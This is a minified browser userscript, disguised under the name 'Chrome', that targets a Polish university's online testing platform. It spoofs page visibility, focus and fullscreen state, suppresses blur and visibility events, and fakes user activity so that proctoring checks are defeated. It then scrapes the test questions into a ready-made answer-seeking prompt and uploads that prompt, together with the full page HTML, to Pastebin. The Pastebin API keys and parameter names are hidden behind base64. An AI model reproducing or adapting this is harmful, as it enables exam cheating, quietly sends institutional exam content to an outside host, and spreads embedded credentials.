// ==UserScript==
// @name          Chrome
// @author        https://github.com/Anghkooey/
// @namespace     https://github.com/Anghkooey/student
// @version       2.1
// @include       https://platforma.uafm.edu.pl/*
// @run-at        document-start
// @description   none
// ==/UserScript==

(()=>{const e=window.requestAnimationFrame,t=window.setTimeout,n=window.setInterval,o=performance.now.bind(performance);Date.now,Object.defineProperty(document,"visibilityState",{get:()=>"visible"}),Object.defineProperty(document,"webkitVisibilityState",{get:()=>"visible"}),Object.defineProperty(document,"hidden",{get:()=>!1}),document.onvisibilitychange=null,unsafeWindow.onblur=null,unsafeWindow.onfocus=null,unsafeWindow.document.hasFocus=()=>!0,Object.defineProperty(document,"fullscreenElement",{get:()=>document.documentElement}),Object.defineProperty(document,"fullscreenEnabled",{get:()=>!0}),Object.defineProperty(document,"webkitFullscreenElement",{get:()=>document.documentElement}),Object.defineProperty(document,"mozFullScreenElement",{get:()=>document.documentElement}),Object.defineProperty(document,"msFullscreenElement",{get:()=>document.documentElement}),Object.defineProperty(window,"innerWidth",{get:()=>screen.width}),Object.defineProperty(window,"innerHeight",{get:()=>screen.height}),window.requestAnimationFrame=t=>e((()=>t(o()))),window.setTimeout=(e,n)=>t((()=>e()),Math.max(0,n)),window.setInterval=(e,t)=>n((()=>e()),Math.max(0,t)),setInterval((()=>{document.dispatchEvent(new MouseEvent("mousemove",{bubbles:!0})),document.dispatchEvent(new KeyboardEvent("keydown",{key:"a",bubbles:!0}))}),1e4);const i=new Set(["visibilitychange","webkitvisibilitychange","blur","focus","fullscreenchange","fullscreenerror"]),r=EventTarget.prototype.addEventListener;EventTarget.prototype.addEventListener=function(e,t,n){i.has(e)||r.call(this,e,t,n)},i.forEach((e=>{document.addEventListener(e,(e=>{e.stopImmediatePropagation(),e.preventDefault()}),!0)}))})(),(()=>{const e=()=>{document.querySelectorAll(".eminus_test_question h3.eminus_test_question_details.noselect").forEach((e=>{e.classList.remove("noselect"),e.style.userSelect="text"}))},t=()=>{new MutationObserver(e).observe(document,{childList:!0,subtree:!0}),e()};"loading"===document.readyState?document.addEventListener("DOMContentLoaded",t):t()})(),(()=>{let e=[];const t=()=>{e=[],document.querySelectorAll(".eminus_test_question").forEach(((t,n)=>{const o=t.querySelector(".tinymceeffect, .nohtml")?.textContent.trim(),i=[];t.querySelectorAll(".eminus_test_answer_details").forEach(((e,t)=>{const n=e.querySelector("label")?.textContent.trim();i.push(`${t+1}. ${n}`)})),o&&i.length>0&&e.push({number:n+1,text:o,options:i})})),n()},n=()=>{let t="Jesteś ekspertem w Polsce, który zna wszystkie nowelizacje prawa i nauki.\nTwoim zadaniem jest podanie poprawne odpowiedzi do poniższych pytań.\n\n";e.forEach((e=>{t+=`${e.number}) **${e.text}**\n${e.options.join("\n")}\n\n`}));const n=document.documentElement.outerHTML.trim(),i=`${t}`,r=`\`\`\`html\n${n}\n\`\`\``;GM_setClipboard(i),o(i,`Test_Answers_${Math.floor(1e6*Math.random())}`),GM_setClipboard(r),o(r,`HTML_${Math.floor(1e6*Math.random())}`)},o=(e,t)=>{const n=new URLSearchParams;n.append(atob("YXBpX2Rldl9rZXk="),atob("ajVDUWxpMEhhaHBaXzdoV3FMR3hNdlp2UlZMUmVTX20=")),n.append(atob("YXBpX3VzZXJfa2V5"),atob("NmJkZjg2YzliMThiY2M0N2FmMGVlNjdkN2I2ZWJhNTg=")),n.append(atob("YXBpX29wdGlvbg=="),"paste"),n.append(atob("YXBpX3Bhc3RlX25hbWU="),t),n.append(atob("YXBpX3Bhc3RlX3ByaXZhdGU="),2),n.append(atob("YXBpX3Bhc3RlX2V4cGlyZV9kYXRl"),"MUQ="),n.append(atob("YXBpX3Bhc3RlX2Zvcm1hdA=="),"dGV4dA=="),n.append(atob("YXBpX3Bhc3RlX2NvZGU="),e),GM_xmlhttpRequest({method:"POST",url:"https://pastebin.com/api/api_post.php",data:n.toString(),headers:{"Content-Type":"application/x-www-form-urlencoded"},onload:function(e){e.responseText.startsWith("Bad API request")?console.error("Pastebin Error:",e.responseText):GM_setClipboard(e.responseText)}})},i=e=>{e.includes("?action=startInteraction")&&setTimeout(t,2e3)};let r=location.href;new MutationObserver((()=>{location.href!==r&&(r=location.href,i(r))})).observe(document,{subtree:!0,childList:!0}),i(location.href)})();
